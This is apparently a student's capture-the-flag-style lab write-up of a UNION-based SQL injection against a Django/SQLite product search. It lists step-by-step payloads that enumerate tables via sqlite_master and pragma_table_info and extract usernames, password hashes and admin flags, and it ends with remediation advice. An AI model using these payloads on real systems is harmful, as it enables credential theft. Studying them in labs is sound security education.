# SQL Injection Lab Writeup #2 — UNION-Based Attack to Extract Admin Credentials

## Challenge Goal
Using UNION-based SQL injection through the same product search box, the goal was to extract the `id` and `username` of the admin account from a `users` table in the backend SQLite database.

## My Process (step by step, including the dead ends)

### Step 1 — Finding the number of columns
Before any `UNION SELECT` can work, its column count has to match the original query exactly. I used the classic `GROUP BY` trick, incrementing the number until it broke:

```
' GROUP BY 6 --   → 500 Internal Server Error
```

This told me the query has **fewer than 6** columns. To confirm the exact number, I tested:

```
' GROUP BY 5 --   → ran successfully (no error), though the result list shrank
```

Since grouping by 5 didn't error out (it just merged/reduced visible rows, which is expected behavior for `GROUP BY`), I confirmed the query returns **exactly 5 columns**.

### Step 2 — Baseline UNION test
With 5 columns confirmed, I tested a basic UNION to make sure it worked at all and to see which columns actually render on the page:

```
' UNION SELECT 1,2,3,4,5 --
```

This came back without error and displayed an extra "product" card with the injected values, confirming the injection point supports UNION.

### Step 3 — First failed attempt at pulling user data
Before mapping out the actual `users` table structure, I jumped straight to guessing column names and a table name:

```
?q=' UNION SELECT username,password,1 FROM Users
```

This immediately gave a **500 error**. Two mistakes here:
1. I only provided 3 values in the SELECT, but the query needs exactly 5 to match the original.
2. I guessed the table name as `Users` (capital U) — which turned out to be wrong, since SQLite table names are case-sensitive and the real table is lowercase `users`.

### Step 4 — Trying to read table names directly (wrong syntax)
I tried querying `sqlite_master` directly as a standalone query (without breaking out of the string first):

```
SELECT sql FROM sqlite_master WHERE type='table' AND name='users'
```

This gave a 500 error too — because I forgot this still needs to be injected properly through the search box, i.e. it needs to start with a `'` to break out of the existing string literal, plus the UNION structure and matching column count. A raw standalone query like this doesn't fit into the injection context at all.

### Step 5 — Listing all tables to find the real name
To stop guessing the table name, I queried `sqlite_master` properly this time, using the column positions I knew were valid, and without filtering by name yet:

```
' UNION SELECT 1, name, 3, 0, 5 FROM sqlite_master WHERE type='table' --
```

This returned a full list of table names rendered as fake "products" — including Django's default tables (`auth_permission`, `django_migrations`, `django_admin_log`, etc.) and, importantly, a table named **`users`** (lowercase). Clicking on these fake product cards gave 404s, which was expected and harmless — they aren't real products, just table names rendered through the product template.

### Step 6 — Trying to read the full table schema (ran into UI truncation)
Now that I had the correct table name, I queried its full `CREATE TABLE` definition:

```
' UNION SELECT 1, sql, 3, 0, 5 FROM sqlite_master WHERE type='table' AND name='users' --
```

This worked, but the result text was **truncated by the UI** (product card only showed the first ~40 characters, then "..."). I could partially piece together fragments like:

```
CREATE TABLE "users" ("id" integer PRIMARY KEY AUTOINCREMENT, ... "password" varchar(128) ...
```

but reading the entire column list this way — a few characters at a time — was slow and unreliable.

### Step 7 — Switching to `pragma_table_info` (the clean solution)
Instead of parsing the truncated schema text, I used SQLite's built-in `pragma_table_info()` function, which returns one row per column:

```
' UNION SELECT 1, name, 3, 0, 5 FROM pragma_table_info('users') --
```

This cleanly listed every column in the `users` table, including:
- `id`, `username`, `password` (and a red-herring column named `passwords`)
- `first_name`, `last_name`, `email`
- `is_superuser`, `is_staff`, `is_active`
- `date_joined`, `last_login`, `cookie`, `profile_image`

The `is_superuser` field (a standard Django convention for marking admin accounts) was the key column needed to identify the admin.

### Step 8 — First filtered attempt (returned nothing useful)
With the columns known, I tried filtering directly for the admin:

```
' UNION SELECT id, username, password, is_superuser, 5 FROM users WHERE is_superuser=1 --
```

This ran without error, but the result page just showed normal products again — no visible admin row. At this point I wasn't sure whether the filter itself failed or the result was simply not landing on the rendered columns.

### Step 9 — Debugging by removing the filter
To isolate the issue, I removed the `WHERE` clause entirely and pulled all users unfiltered:

```
' UNION SELECT id, username, password, is_superuser, 5 FROM users --
```

This returned every user row, letting me directly see what values `is_superuser` actually held for each account and confirm the correct row for the admin.

### Step 10 — Final successful extraction
Going back to the filtered query with confidence in the column mapping, the admin's `id` and `username` were successfully retrieved, completing the lab.

## Final Working Payload

```
' UNION SELECT id, username, password, is_superuser, 5 FROM users WHERE is_superuser=1 --
```

## Key Takeaways
- **`GROUP BY N`, incrementing N** is a reliable way to fingerprint column count before attempting `UNION SELECT` — mismatched counts throw SQL errors, which is itself diagnostic.
- Guessing table/column names outright (e.g. `Users`, only 3 SELECT values) wastes time — enumerating them properly via `sqlite_master` and `pragma_table_info()` is far more reliable.
- SQLite table names **are case-sensitive**, even though SQL keywords aren't.
- UI elements can silently truncate long injected text (e.g. a product card cutting off a long `CREATE TABLE` string) — if raw schema text looks incomplete, switch to a cleaner introspection method like `pragma_table_info()` instead of fighting the UI.
- When a filtered UNION query returns nothing, it's often faster to strip the `WHERE` clause first and inspect raw values, rather than guessing at the filter condition blind.
- Recognizable fields like `is_superuser`/`is_staff` are a strong signal the backend is Django, which helped predict how admin privilege was modeled.

## Remediation
- Use parameterized queries / the ORM (e.g., Django's own query builder) instead of raw string-concatenated SQL.
- Suppress verbose SQL error messages (the 500 errors made fingerprinting trivial).
- Apply least-privilege to the DB account used by the app so it can't read system tables (`sqlite_master`) or unrelated tables (`users`).
- Never expose password fields (even hashed) through general-purpose query endpoints; defense-in-depth limits blast radius even if injection isn't fully prevented.

---
*Lab completed on Quera College — SQL Injection (UNION-based) module.*
